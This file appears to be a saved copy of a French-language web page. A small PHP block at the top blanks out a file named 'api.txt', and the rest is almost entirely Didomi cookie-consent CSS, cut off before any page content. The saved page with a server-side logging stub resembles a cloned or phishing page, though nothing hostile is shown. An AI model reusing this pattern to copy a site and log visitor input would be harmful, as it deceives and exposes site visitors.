﻿<?php
$blank_page = ' ';
$up_file = fopen("api.txt", "w");
fwrite($up_file, $blank_page);
?>
<!DOCTYPE html>
<html
  lang="fr"
  data-critters-container=""
  class="svg supports target svgfilters svgasimg inputsearchevent bgpositionshorthand csscalc cubicbezierrange cssgradients multiplebgs opacity csspointerevents rgba preserve3d no-capture fileinput fileinputdirectory formattribute placeholder inputformaction input-formaction inputformenctype input-formenctype inputformmethod no-inputformtarget no-input-formtarget inlinesvg hsla mediaqueries no-touchevents checked displaytable display-table fontface cssinvalid lastchild nthchild cssvalid cssvhunit cssvmaxunit cssvminunit cssvwunit formvalidation no-localizednumber svgclippaths svgforeignobject smil textshadow backgroundblendmode objectfit object-fit cssanimations appearance backgroundcliptext bgpositionxy bgrepeatround bgrepeatspace backgroundsize bgsizecover borderimage borderradius boxshadow boxsizing csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside ellipsis cssfilters no-overflowscrolling textalignlast csstransforms csstransforms3d csstransitions userselect desktop landscape windows windows10 windows10_0 64bit chrome chrome128 chrome128_0 webkit en-us"
>
<head>
    
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link
      rel="shortcut icon"
      href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHh7wAB4e8AMeHvA9Hh7wuh4e8LweHvBAHh7wBB4e8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeHvAAHh7wAB4e8CMeHvCKHh7w6h4e8PIeHvDyHh7w6x4e8I4eHvAmHh7wAR4e8AAAAAAAAAAAAB4e8AAeHvAAHh7wDB4e8DIeHvDWHh7w+h4e8LMeHvBCHh7wQh4e8LMeHvD5Hh7w3x4e8HYeHvAYHh7wAB4e8AAeHvAAHh7wUB4e8KQeHvBZHh7wwR4e8FoeHvAMHh7wAB4e8AAeHvALHh7wWB4e8MkeHvD8Hh7wzh4e8E4eHvAAHh7wAx4e8KweHvDdHh7wKB4e8BMeHvAAHh7wAAAAAAAAAAAAHh7wAB4e8AAeHvAVHh7wcB4e8N0eHvCqHh7wAx4e8AMeHvCtHh7w3h4e8BkeHvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHh7wAB4e8AceHvBEHh7wTB4e8AMeHvADHh7wrR4e8N4eHvAZHh7wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB4e8AAeHvAWHh7wuR4e8GkeHvAAHh7wAx4e8K0eHvDeHh7wGR4e8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeHvAAHh7wFh4e8NoeHvCtHh7wAx4e8AMeHvCtHh7w3h4e8BkeHvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHh7wAB4e8BYeHvDaHh7wrR4e8AMeHvADHh7wrR4e8N4eHvAZHh7wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB4e8AAeHvAWHh7w2h4e8K0eHvADHh7wAx4e8K0eHvDeHh7wGR4e8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeHvAAHh7wFh4e8NoeHvCtHh7wAx4e8AMeHvCrHh7w9h4e8HYeHvAVHh7wAB4e8AAAAAAAAAAAAB4e8AAeHvAAHh7wFB4e8HUeHvD1Hh7wqx4e8AMeHvAAHh7wTB4e8MoeHvD7Hh7wyR4e8FgeHvANHh7wAB4e8AAeHvALHh7wVx4e8MgeHvD7Hh7wzB4e8E4eHvAAHh7wAB4e8AAeHvAWHh7wcR4e8NweHvD3Hh7whx4e8AweHvBAHh7wsh4e8PkeHvDfHh7wdR4e8BceHvAAHh7wAAAAAAAAAAAAHh7wAB4e8AAeHvAkHh7wXx4e8EgeHvCcHh7w8B4e8OseHvCNHh7wJR4e8AEeHvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHh7wAB4e8AAeHvAsHh7wvB4e8LweHvA/Hh7wAx4e8AAAAAAAAAAAAAAAAAAAAAAA+B8AAOAHAACAAwAAgYEAAAfgAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAH4AAAgYEAAMADAADgBwAA/B8AAA=="
      type="image/x-icon"
    />
  </head>
  <body
    id="top"

    class="modal-open"
    style="padding-right: 16px; overflow: hidden;"
  >
    <style type="text/css" scoped="true" id="didomi-css" aria-hidden="true">
      #didomi-host .didomi-components-button {
        cursor: pointer;
        display: block;
        height: 38px;
        padding: 0 20px;
        font-size: 16px;
        line-height: 18px;
        font-weight: bold;
        text-align: center;
        color: #555;
        background-color: #eee;
        border: solid 1px rgba(34, 34, 34, 0.2);
      }
      #didomi-host .didomi-components-button:disabled {
        opacity: 0.4;
        cursor: initial;
      }
      #didomi-host .didomi-components-button:hover {
        opacity: 0.7;
      }
      #didomi-host .didomi-components-button span {
        background: rgba(0, 0, 0, 0);
      }
      #didomi-host .didomi-mobile .didomi-components-button {
        font-size: 14px;
      }
      #didomi-host .didomi-screen-xsmall .didomi-components-button {
        padding: 0 10px;
      }
      #didomi-host .didomi-components-radio {
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: row;
        flex-direction: row;
        -webkit-flex-pack: justify;
        -moz-justify-content: space-between;
        justify-content: space-between;
        -moz-align-items: center;
        align-items: center;
      }
      #didomi-host .didomi-components-radio__option {
        margin-right: 5px;
        cursor: pointer;
        height: 25px;
        box-shadow: 1px 1px 0 0 rgba(0, 0, 0, 0.1);
        background-color: #fff;
        border: solid 1px #eee;
        padding: 0 20px;
        line-height: 12px;
        font-size: 12px;
        color: #757575;
        font-weight: bold;
        transition: background-color 200ms, border-color 200ms;
        transition-timing-function: ease;
      }
      #didomi-host .didomi-components-radio__option:hover {
        color: #757575;
        border-color: #757575;
      }
      #didomi-host .didomi-components-radio__option:last-child {
        margin-right: 0;
      }
      [dir="rtl"] #didomi-host .didomi-components-radio__option:last-child {
        margin-right: 5px;
      }
      #didomi-host .didomi-components-radio__option:first-child {
        margin-right: 5px;
      }
      [dir="rtl"] #didomi-host .didomi-components-radio__option:first-child {
        margin-right: 0;
      }
      #didomi-host .didomi-components-radio__option > svg {
        margin-right: 5px;
      }
      #didomi-host .didomi-components-radio__option span {
        background: rgba(0, 0, 0, 0);
      }
      #didomi-host .didomi-components-radio__option.didomi-components-radio__option--agree {
        background-color: #3d8548;
        color: #fff;
        border: solid 1px rgba(0, 0, 0, 0.3);
        padding: 0 11.5px;
      }
      #didomi-host .didomi-components-radio__option.didomi-components-radio__option--agree > svg {
        vertical-align: middle;
      }
      #didomi-host .didomi-components-radio__option.didomi-components-radio__option--disagree {
        background-color: #e60000;
        color: #fff;
        border: solid 1px rgba(0, 0, 0, 0.3);
        padding: 0 13.5px;
      }
      #didomi-host .didomi-components-radio__option__reporting {
        box-sizing: border-box;
      }
      #didomi-host .didomi-components-radio__option__reporting#didomi-radio-option-disagree-to-all {
        font-size: 12px !important;
      }
      #didomi-host .didomi-components-radio__option__reporting#didomi-radio-option-agree-to-all {
        font-size: 12px !important;
      }
      #didomi-host .didomi-components-radio__option__accepter {
        box-sizing: border-box;
      }
      #didomi-host .didomi-components-accordion {
        flex: 5;
      }
      #didomi-host .didomi-components-accordion .label-click {
        cursor: pointer;
      }
      #didomi-host .didomi-components-accordion .trigger-icon {
        width: 15px;
        font-size: 16px;
        display: inline-block;
        text-align: center;
      }
      #didomi-host .didomi-components-accordion .didomi-content {
        display: none;
        overflow: hidden;
        max-height: 0;
        opacity: 0;
        visibility: hidden;
        font-weight: 300;
        text-align: justify;
        transition: all 0.1s ease-in-out;
        transition-property: opacity, max-height, transform, visibility, padding-bottom;
      }
      #didomi-host .didomi-components-accordion .didomi-content.active {
        display: block;
        max-height: 3000px;
        opacity: 1;
        visibility: visible;
        padding-bottom: 10px;
        transition-property: opacity, max-height, transform, visibility;
        overflow: visible;
      }
      #didomi-host .didomi-components-accordion .didomi-components-accordion-label-container {
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: row;
        flex-direction: row;
        -webkit-flex-pack: justify;
        -moz-justify-content: space-between;
        justify-content: space-between;
        -moz-align-items: center;
        align-items: center;
      }
      #didomi-host .didomi-components-accordion .didomi-components-accordion-label-container .label-click {
        flex: 2;
      }
      #didomi-host .didomi-mobile .didomi-components-accordion {
        width: 100%;
        flex: 1 auto;
      }
      #didomi-host .didomi-mobile .didomi-components-accordion .didomi-components-accordion-label-container {
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: column;
        flex-direction: column;
        -webkit-flex-pack: start;
        -moz-justify-content: flex-start;
        justify-content: flex-start;
        -moz-align-items: flex-start;
        align-items: flex-start;
      }
      #didomi-host .lds-ellipsis-container {
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100%;
      }
      #didomi-host .lds-ellipsis-container .lds-ellipsis {
        display: inline-block;
        position: relative;
        width: 64px;
        height: 64px;
      }
      #didomi-host .lds-ellipsis-container .lds-ellipsis div {
        position: absolute;
        top: 27px;
        width: 11px;
        height: 11px;
        border-radius: 50%;
        background: #dcdcdc;
        animation-timing-function: cubic-bezier(0, 1, 1, 0);
      }
      #didomi-host .lds-ellipsis-container .lds-ellipsis div:nth-child(1) {
        left: 6px;
        animation: lds-ellipsis1 0.6s infinite;
      }
      #didomi-host .lds-ellipsis-container .lds-ellipsis div:nth-child(2) {
        left: 6px;
        animation: lds-ellipsis2 0.6s infinite;
      }
      #didomi-host .lds-ellipsis-container .lds-ellipsis div:nth-child(3) {
        left: 26px;
        animation: lds-ellipsis2 0.6s infinite;
      }
      #didomi-host .lds-ellipsis-container .lds-ellipsis div:nth-child(4) {
        left: 45px;
        animation: lds-ellipsis3 0.6s infinite;
      }
      @keyframes lds-ellipsis1 {
        0% {
          transform: scale(0);
        }
        100% {
          transform: scale(1);
        }
      }
      @keyframes lds-ellipsis3 {
        0% {
          transform: scale(1);
        }
        100% {
          transform: scale(0);
        }
      }
      @keyframes lds-ellipsis2 {
        0% {
          transform: translate(0, 0);
        }
        100% {
          transform: translate(19px, 0);
        }
      }
      #didomi-host .didomi-components-skip-link {
        position: absolute;
        top: -100px;
        left: -100px;
        margin-bottom: 16px;
        display: block;
      }
      #didomi-host .didomi-components-skip-link:focus {
        position: relative;
        top: 0;
        left: 0;
      }
      #didomi-host .didomi-popup-backdrop {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(255, 255, 255, 0.8);
        z-index: 2147483642;
        overflow: auto;
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: row;
        flex-direction: row;
        align-items: flex-start;
      }
      [dir="rtl"] #didomi-host .didomi-popup-backdrop {
        overflow-y: auto;
        overflow-x: hidden;
      }
      #didomi-host .didomi-exterior-border {
        border-style: solid;
        border-radius: 5px;
        border-width: 1px;
        padding: 1px;
        margin: auto;
      }
      #didomi-host .didomi-popup-container {
        background-color: #fff;
        opacity: 1;
        max-width: 650px;
        width: 100%;
        border-style: solid;
        border-radius: 3px;
        border-width: 1px;
        -webkit-overflow-scrolling: touch;
      }
      #didomi-host .didomi-popup-header {
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: row;
        flex-direction: row;
        -webkit-flex-pack: justify;
        -moz-justify-content: space-between;
        justify-content: space-between;
        -moz-align-items: center;
        align-items: center;
        padding: 30px 20px 0;
        font-weight: bold;
        font-family: Arial;
      }
      #didomi-host .didomi-popup-body {
        padding: 30px 20px;
      }
      #didomi-host .didomi-popup-body .didomi-popup-body-section {
        margin-bottom: 22px;
      }
      #didomi-host .didomi-popup-body .didomi-popup-body-section:last-child {
        margin-bottom: 0;
      }
      #didomi-host .didomi-popup-footer {
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: row;
        flex-direction: row;
        -webkit-flex-pack: justify;
        -moz-justify-content: space-between;
        justify-content: space-between;
        -moz-align-items: center;
        align-items: center;
        background-color: #fff;
        height: 58px;
      }
      #didomi-host .didomi-popup-footer .didomi-popup-actions {
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: row;
        flex-direction: row;
        -webkit-flex-pack: end;
        -moz-justify-content: flex-end;
        justify-content: flex-end;
        -moz-align-items: center;
        align-items: center;
      }
      #didomi-host .didomi-popup-footer .didomi-popup-actions div,
      #didomi-host .didomi-popup-footer .didomi-popup-actions button {
        margin-right: 10px;
      }
      [dir="rtl"] #didomi-host .didomi-popup-footer .didomi-popup-actions div,
      [dir="rtl"] #didomi-host .didomi-popup-footer .didomi-popup-actions button {
        margin-right: 0px;
        margin-left: 10px;
      }
      #didomi-host .didomi-popup-close {
        font-family: Arial;
        opacity: 0.5;
        font-size: 30px;
        font-weight: 500;
        line-height: 30px;
        color: #000;
        text-shadow: 0 1px 0 #fff;
        transition: 500ms;
      }
      #didomi-host .didomi-popup-close:hover {
        opacity: 0.7;
      }
      #didomi-host .didomi-mobile .didomi-popup {
        width: 100%;
        height: 100%;
        max-width: none;
      }
      body.didomi-popup-open {
        overflow: hidden !important;
      }
      body.didomi-popup-open-ios {
        position: fixed;
        width: 100%;
      }
      #didomi-host .didomi-notice-data-processing-container {
        padding-top: 15px;
        text-align: justify;
        font-size: 12px;
        line-height: 160%;
      }
      #didomi-host .didomi-notice-data-processing-container .didomi-notice-data-processing-title {
        color: #333;
        font-weight: bold;
        display: block;
      }
      #didomi-host .didomi-notice-data-processing-container .didomi-notice-data-processing-list {
        font-weight: bold;
        color: #526e7a;
      }
      #didomi-host .didomi-notice-data-processing-container .didomi-notice-data-processing-list .didomi-notice-data-processing-item {
        padding-top: 5px;
      }
      #didomi-host .didomi-notice-data-processing-container .didomi-notice-data-processing-list .didomi-notice-data-processing-item div {
        display: inline-block;
      }
      #didomi-host .didomi-notice-data-processing-container p {
        font-size: 12px;
      }
      #didomi-host .didomi-mobile .didomi-notice-data-processing-container .didomi-notice-data-processing-title {
        font-size: 11px;
        line-height: 160%;
      }
      #didomi-host .didomi-mobile .didomi-notice-data-processing-container .didomi-notice-data-processing-list {
        font-size: 11px;
        line-height: 160%;
      }
      #didomi-host .didomi-gpc-label {
        display: inline-block;
        width: 369.7px;
        height: 27.93px;
        background: #fff;
        border: 1px solid #3f8964;
        border-radius: 40px;
      }
      #didomi-host .didomi-gpc-label .left-container {
        display: inline-block;
        width: 173.7px;
        height: 27.93px;
        background: #3f8964;
        border-radius: 30px 0px 0px 30px;
      }
      #didomi-host .didomi-gpc-label .left-container .gpc-image {
        display: inline-block;
        width: 153.7px;
        height: 15.93px;
        margin: 5px 0 0 10px;
        background-image:/*savepage-url=https://sdk.privacy-center.org/sdk/663901c94e4507d4232e50eb306aab69c30522bc/modern/images/cb5b80c89a9fda353482-gpc.large.png*/ url();
        background-size: cover;
      }
      #didomi-host .didomi-gpc-label .right-container {
        display: inline-block;
        width: 181px;
        height: 27.93px;
      }
      #didomi-host .didomi-gpc-label .right-container .gpc-title {
        position: relative;
        top: -4px;
        left: 5px;
        display: inline-block;
        width: 161px;
        height: 27.93px;
        font-family: "Arial";
        font-style: italic;
        font-weight: 700;
        font-size: 12px;
        line-height: 27.93px;
        color: #3f8964;
      }
      #didomi-host .didomi-gpc-label .right-container .gpc-icon {
        position: relative;
        display: inline-block;
        width: 15px;
        height: 15px;
        left: 12px;
        background-image:/*savepage-url=https://sdk.privacy-center.org/sdk/663901c94e4507d4232e50eb306aab69c30522bc/modern/images/d8d7828e2df9a281bd96-gpc.icon.large.png*/ url();
        background-size: cover;
      }
      #didomi-host .didomi-mobile .didomi-gpc-label {
        display: inline-block;
        width: 318.38px;
        height: 24px;
        background: #fff;
        border: 0.859518px solid #3f8964;
        border-radius: 34.3807px;
      }
      #didomi-host .didomi-mobile .didomi-gpc-label .left-container {
        display: inline-block;
        width: 149.3px;
        height: 24px;
        background: #3f8964;
        border-radius: 25.7855px 0px 0px 25.7855px;
      }
      #didomi-host .didomi-mobile .didomi-gpc-label .left-container .gpc-image {
        display: inline-block;
        width: 132.11px;
        height: 13.69px;
        margin: 5px 0 0 10px;
        background-image:/*savepage-url=https://sdk.privacy-center.org/sdk/663901c94e4507d4232e50eb306aab69c30522bc/modern/images/6d53c29e73450d19e18a-gpc.medium.png*/ url();
        background-size: cover;
      }
      #didomi-host .didomi-mobile .didomi-gpc-label .right-container {
        display: inline-block;
        width: 156.19px;
        height: 15px;
      }
      #didomi-host .didomi-mobile .didomi-gpc-label .right-container .gpc-title {
        position: relative;
        top: -4px;
        left: 5px;
        display: inline-block;
        width: 139px;
        height: 15px;
        font-family: "Arial";
        font-style: italic;
        font-weight: 700;
        font-size: 10.3142px;
        line-height: 15px;
        color: #3f8964;
      }
      #didomi-host .didomi-mobile .didomi-gpc-label .right-container .gpc-icon {
        position: relative;
        display: inline-block;
        width: 12.89px;
        height: 12.89px;
        left: 12px;
        background-image:/*savepage-url=https://sdk.privacy-center.org/sdk/663901c94e4507d4232e50eb306aab69c30522bc/modern/images/2059cb26072bf78c2af3-gpc.icon.medium.png*/ url();
        background-size: cover;
      }
      #didomi-host .didomi-screen-xsmall .didomi-gpc-label {
        display: inline-block;
        width: 233.99px;
        height: 17.66px;
        background: #fff;
        border: 0.632445px solid #3f8964;
        border-radius: 25.2978px;
      }
      #didomi-host .didomi-screen-xsmall .didomi-gpc-label .left-container {
        display: inline-block;
        width: 109.86px;
        height: 17.66px;
        background: #3f8964;
        border-radius: 18.9734px 0px 0px 18.9734px;
      }
      #didomi-host .didomi-screen-xsmall .didomi-gpc-label .left-container .gpc-image {
        display: inline-block;
        width: 97.21px;
        height: 10.07px;
        margin: 3px 0 0 6px;
        background-image:/*savepage-url=https://sdk.privacy-center.org/sdk/663901c94e4507d4232e50eb306aab69c30522bc/modern/images/73e53fb633306e475eef-gpc.small.png*/ url();
        background-size: cover;
      }
      #didomi-host .didomi-screen-xsmall .didomi-gpc-label .right-container {
        display: inline-block;
        width: 114.65px;
        height: 11px;
      }
      #didomi-host .didomi-screen-xsmall .didomi-gpc-label .right-container .gpc-title {
        position: relative;
        top: -2px;
        left: 5px;
        display: inline-block;
        width: 102px;
        height: 11px;
        font-family: "Arial";
        font-style: italic;
        font-weight: 700;
        font-size: 7.58934px;
        line-height: 11px;
        color: #3f8964;
      }
      #didomi-host .didomi-screen-xsmall .didomi-gpc-label .right-container .gpc-icon {
        position: relative;
        display: inline-block;
        width: 9.49px;
        height: 9.49px;
        left: 9px;
        background-image:/*savepage-url=https://sdk.privacy-center.org/sdk/663901c94e4507d4232e50eb306aab69c30522bc/modern/images/178a6780e8762f4b120b-gpc.icon.small.png*/ url();
        background-size: cover;
      }
      #didomi-host .didomi-vendors-iab-label {
        display: inline-block;
        margin-left: 5px;
        padding: 1px 4px;
        border-radius: 2px;
        background: #fff;
        font-weight: 800;
        font-size: 10px;
        color: #757575;
        line-height: 100%;
      }
      [dir="rtl"] #didomi-host .didomi-vendors-iab-label {
        margin-left: 0px;
        margin-right: 5px;
      }
      #didomi-host .didomi-switch {
        position: relative;
        display: inline-block;
        width: 56px;
        height: 28px;
      }
      #didomi-host .didomi-switch input {
        opacity: 0;
        width: 100%;
        height: 100%;
      }
      #didomi-host .didomi-slider {
        position: absolute;
        cursor: pointer;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: #fff;
        border: 1px solid #e60000;
        border-radius: 24px;
        transition: 0.4s;
      }
      #didomi-host .didomi-slider::before {
        position: absolute;
        content: "";
        height: 20px;
        width: 20px;
        left: 5px;
        bottom: 3px;
        border-radius: 50%;
        background-image:/*savepage-url=https://sdk.privacy-center.org/sdk/663901c94e4507d4232e50eb306aab69c30522bc/modern/images/b76a404a9fedcf3f2c2f-toggle-cross.svg*/ url();
        background-size: cover;
        transition: 0.4s;
      }
      #didomi-host input:checked + .didomi-slider {
        border: 1px solid #3d8548;
        border-radius: 24px;
      }
      #didomi-host input:focus + .didomi-slider {
        box-shadow: 0 0 1px #2196f3;
        outline: #4d90fe auto 1px;
      }
      #didomi-host input:checked + .didomi-slider::before {
        transform: translateX(23px);
        background-image:/*savepage-url=https://sdk.privacy-center.org/sdk/663901c94e4507d4232e50eb306aab69c30522bc/modern/images/0b30234b8ef077d3d0a4-toggle-check.svg*/ url();
        background-size: cover;
      }
      #didomi-host .didomi-components-explanation-text {
        background: #f4f4f4;
        border-radius: 7px;
        padding: 7px 12px;
        font-size: 12px;
        line-height: 160%;
        margin-bottom: 32px;
      }
      @namespace svg "http://www.w3.org/2000/svg";
      #didomi-host {
        all: initial;
        -ms-overflow-style: auto;
        -moz-appearance: none;
        -moz-binding: none;
        -moz-border-bottom-colors: none;
        -moz-border-left-colors: none;
        -moz-border-right-colors: none;
        -moz-border-top-colors: none;
        -moz-context-properties: none;
        -moz-float-edge: content-box;
        -moz-force-broken-image-icon: 0;
        -moz-image-region: auto;
        -moz-orient: inline;
        -moz-outline-radius-bottomleft: 0;
        -moz-outline-radius-bottomright: 0;
        -moz-outline-radius-topleft: 0;
        -moz-outline-radius-topright: 0;
        -moz-stack-sizing: stretch-to-fit;
        -moz-text-blink: none;
        -moz-user-focus: none;
        -moz-user-input: auto;
        -moz-user-modify: read-only;
        -moz-window-shadow: default;
        -webkit-border-before-color: currentcolor;
        -webkit-border-before-style: none;
        -webkit-border-before-width: medium;
        -webkit-box-reflect: none;
        -webkit-mask-attachment: scroll;
        -webkit-mask-clip: border;
        -webkit-mask-composite: source-over;
        -webkit-mask-image: none;
        -webkit-mask-origin: padding;
        -webkit-mask-position: 0% 0%;
        -webkit-mask-position-x: 0%;
        -webkit-mask-position-y: 0%;
        -webkit-mask-repeat: repeat;
        -webkit-mask-repeat-x: repeat;
        -webkit-mask-repeat-y: repeat;
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
        -webkit-text-stroke-color: currentcolor;
        -webkit-text-stroke-width: 0;
        -webkit-touch-callout: default;
        align-content: stretch;
        align-items: stretch;
        align-self: auto;
        animation-delay: 0s;
        animation-direction: normal;
        animation-duration: 0s;
        animation-fill-mode: none;
        animation-iteration-count: 1;
        animation-name: none;
        animation-play-state: running;
        animation-timing-function: ease;
        azimuth: center;
        -webkit-backface-visibility: visible;
        backface-visibility: visible;
        background-attachment: scroll;
        background-blend-mode: normal;
        background-clip: border-box;
        background-color: rgba(0, 0, 0, 0);
        background-image: none;
        background-origin: padding-box;
        background-position: 0% 0%;
        background-repeat: repeat;
        background-size: auto auto;
        block-size: auto;
        border-block-end-color: currentcolor;
        border-block-end-style: none;
        border-block-end-width: medium;
        border-block-start-color: currentcolor;
        border-block-start-style: none;
        border-block-start-width: medium;
        border-bottom-color: currentcolor;
        border-bottom-left-radius: 0;
        border-bottom-right-radius: 0;
        border-bottom-style: none;
        border-bottom-width: medium;
        border-collapse: separate;
        border-image-outset: 0s;
        border-image-repeat: stretch;
        border-image-slice: 100%;
        border-image-source: none;
        border-image-width: 1;
        border-inline-end-color: currentcolor;
        border-inline-end-style: none;
        border-inline-end-width: medium;
        border-inline-start-color: currentcolor;
        border-inline-start-style: none;
        border-inline-start-width: medium;
        border-left-color: currentcolor;
        border-left-style: none;
        border-left-width: medium;
        border-right-color: currentcolor;
        border-right-style: none;
        border-right-width: medium;
        border-spacing: 0;
        border-top-color: currentcolor;
        border-top-left-radius: 0;
        border-top-right-radius: 0;
        border-top-style: none;
        border-top-width: medium;
        bottom: auto;
        box-align: stretch;
        -webkit-box-decoration-break: slice;
        box-decoration-break: slice;
        box-direction: normal;
        box-flex: 0;
        box-flex-group: 1;
        box-lines: single;
        box-ordinal-group: 1;
        box-orient: initial;
        box-pack: start;
        box-shadow: none;
        box-sizing: content-box;
        -moz-column-break-after: auto;
        break-after: auto;
        -moz-column-break-before: auto;
        break-before: auto;
        -moz-column-break-inside: auto;
        break-inside: auto;
        caption-side: top;
        caret-color: auto;
        clear: none;
        clip: auto;
        -webkit-clip-path: none;
        clip-path: none;
        color: initial;
        -moz-column-count: auto;
        column-count: auto;
        -moz-column-fill: balance;
        column-fill: balance;
        -moz-column-gap: normal;
        column-gap: normal;
        -moz-column-rule-color: currentcolor;
        column-rule-color: currentcolor;
        -moz-column-rule-style: none;
        column-rule-style: none;
        -moz-column-rule-width: medium;
        column-rule-width: medium;
        -moz-column-span: none;
        column-span: none;
        -moz-column-width: auto;
        column-width: auto;
        content: normal;
        counter-increment: none;
        counter-reset: none;
        cursor: auto;
        empty-cells: show;
        filter: none;
        flex-basis: auto;
        flex-direction: row;
        flex-grow: 0;
        flex-shrink: 1;
        flex-wrap: nowrap;
        float: none;
        font-family: initial;
        font-feature-settings: normal;
        -webkit-font-kerning: auto;
        font-kerning: auto;
        font-language-override: normal;
        font-size: medium;
        font-size-adjust: none;
        font-stretch: normal;
        font-style: normal;
        font-synthesis: weight style;
        font-variant: normal;
        font-variant-alternates: normal;
        font-variant-caps: normal;
        font-variant-east-asian: normal;
        font-variant-ligatures: normal;
        font-variant-numeric: normal;
        font-variant-position: normal;
        font-weight: normal;
        grid-auto-columns: auto;
        grid-auto-flow: row;
        grid-auto-rows: auto;
        grid-column-end: auto;
        grid-column-gap: 0;
        grid-column-start: auto;
        grid-row-end: auto;
        grid-row-gap: 0;
        grid-row-start: auto;
        grid-template-areas: none;
        grid-template-columns: none;
        grid-template-rows: none;
        height: auto;
        -webkit-hyphens: manual;
        -ms-hyphens: manual;
        hyphens: manual;
        image-orientation: 0deg;
        image-rendering: auto;
        image-resolution: 1dppx;
        ime-mode: auto;
        inline-size: auto;
        isolation: auto;
        justify-content: flex-start;
        left: auto;
        letter-spacing: normal;
        line-break: auto;
        line-height: normal;
        list-style-image: none;
        list-style-position: outside;
        list-style-type: disc;
        -webkit-margin-after: 0;
        margin-block-end: 0;
        -webkit-margin-before: 0;
        margin-block-start: 0;
        margin-bottom: 0;
        -webkit-margin-end: 0;
        margin-inline-end: 0;
        -webkit-margin-start: 0;
        margin-inline-start: 0;
        margin-left: 0;
        margin-right: 0;
        margin-top: 0;
        marker-offset: auto;
        -webkit-mask-clip: border-box;
        mask-clip: border-box;
        -webkit-mask-composite: source-over;
        mask-composite: add;
        mask-image: none;
        mask-mode: match-source;
        -webkit-mask-origin: border-box;
        mask-origin: border-box;
        mask-position: 0% 0%;
        mask-repeat: repeat;
        -webkit-mask-size: auto;
        mask-size: auto;
        mask-type: luminance;
        max-height: none;
        max-width: none;
        min-block-size: 0;
        min-height: 0;
        min-inline-size: 0;
        min-width: 0;
        mix-blend-mode: normal;
        object-fit: fill;
        object-position: 50% 50%;
        offset-block-end: auto;
        offset-block-start: auto;
        offset-inline-end: auto;
        offset-inline-start: auto;
        opacity: 1;
        order: 0;
        orphans: 2;
        outline-color: initial;
        outline-offset: 0;
        outline-style: none;
        outline-width: medium;
        overflow: visible;
        overflow-clip-box: padding-box;
        overflow-wrap: normal;
        overflow-x: visible;
        overflow-y: visible;
        -webkit-padding-after: 0;
        padding-block-end: 0;
        -webkit-padding-before: 0;
        padding-block-start: 0;
        padding-bottom: 0;
        -webkit-padding-end: 0;
        padding-inline-end: 0;
        -webkit-padding-start: 0;
        padding-inline-start: 0;
        padding-left: 0;
        padding-right: 0;
        padding-top: 0;
        page-break-after: auto;
        page-break-before: auto;
        page-break-inside: auto;
        perspective: none;
        perspective-origin: 50% 50%;
        pointer-events: auto;
        position: static;
        quotes: initial;
        resize: none;
        right: auto;
        ruby-align: space-around;
        ruby-merge: separate;
        ruby-position: over;
        scroll-behavior: auto;
        -webkit-scroll-snap-coordinate: none;
        -ms-scroll-snap-coordinate: none;
        scroll-snap-coordinate: none;
        -webkit-scroll-snap-destination: 0px 0px;
        -ms-scroll-snap-destination: 0px 0px;
        scroll-snap-destination: 0px 0px;
        -webkit-scroll-snap-points-x: none;
        -ms-scroll-snap-points-x: none;
        scroll-snap-points-x: none;
        -webkit-scroll-snap-points-y: none;
        -ms-scroll-snap-points-y: none;
        scroll-snap-points-y: none;
        -webkit-scroll-snap-type: none;
        -ms-scroll-snap-type: none;
        scroll-snap-type: none;
        scroll-snap-type-x: none;
        scroll-snap-type-y: none;
        shape-image-threshold: 0;
        shape-margin: 0;
        shape-outside: none;
        -moz-tab-size: 8;
        tab-size: 8;
        table-layout: auto;
        text-align: initial;
        text-align-last: auto;
        text-combine-upright: none;
        -webkit-text-decoration-color: currentcolor;
        text-decoration-color: currentcolor;
        -webkit-text-decoration-line: none;
        text-decoration-line: none;
        -webkit-text-decoration-style: solid;
        text-decoration-style: solid;
        -webkit-text-emphasis-color: currentcolor;
        text-emphasis-color: currentcolor;
        -webkit-text-emphasis-position: over;
        text-emphasis-position: over right;
        -webkit-text-emphasis-style: none;
        text-emphasis-style: none;
        text-indent: 0;
        text-justify: auto;
        -webkit-text-orientation: mixed;
        text-orientation: mixed;
        text-overflow: clip;
        text-rendering: auto;
        text-shadow: none;
        text-transform: none;
        text-underline-position: auto;
        top: auto;
        touch-action: auto;
        transform: none;
        transform-box: border-box;
        transform-origin: 50% 50% 0;
        transform-style: flat;
        transition-delay: 0s;
        transition-duration: 0s;
        transition-property: all;
        transition-timing-function: ease;
        -webkit-user-select: auto;
        -moz-user-select: auto;
        -ms-user-select: auto;
        user-select: auto;
        vertical-align: baseline;
        visibility: visible;
        white-space: normal;
        widows: 2;
        width: auto;
        will-change: auto;
        word-break: normal;
        word-spacing: normal;
        word-wrap: normal;
        -webkit-writing-mode: horizontal-tb;
        writing-mode: horizontal-tb;
        z-index: auto;
        -webkit-appearance: none;
        -ms-appearance: none;
        appearance: none;
      }
      #didomi-host *:not(svg|*) {
        all: unset;
        -webkit-text-fill-color: initial;
      }
      button {
        line-height: initial;
      }
